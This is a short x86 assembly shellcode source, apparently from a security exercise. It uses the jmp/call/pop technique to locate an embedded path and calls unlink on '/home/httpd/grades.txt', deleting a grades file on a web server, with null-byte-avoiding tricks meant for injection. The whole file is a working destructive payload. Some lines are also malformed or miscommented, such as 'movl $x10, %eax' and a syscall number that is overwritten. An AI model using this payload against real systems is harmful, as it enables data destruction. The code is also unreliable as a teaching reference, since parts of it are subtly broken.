#include <sys/syscall.h>

#define STRING	"/home/httpd/grades.txt"
#define STRLEN	22
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
	xorl	%eax,%eax			/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
	movl	%eax,(ENVP)(%esi)	/* set up null envp */

	movb	$SYS_unlink,%al		/* unlink to rm a file */
	movl	%esi,%ebx			/* syscall arg 2: string pathname */

	push $0x08
	pop %eax
	push $0x02 
	pop %ecx
	orl %ecx, %eax
	int	$0x80					/* invoke call */

	movl $x10, %eax
	int	$0x80

	xorl	%ebx,%ebx			/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax					/* syscall arg 1: SYS_exit (1), uses */
								/* mov+inc to avoid null byte */
	int	$0x80					/* invoke call */

 calladdr:
	call	popladdr
	.ascii	STRING
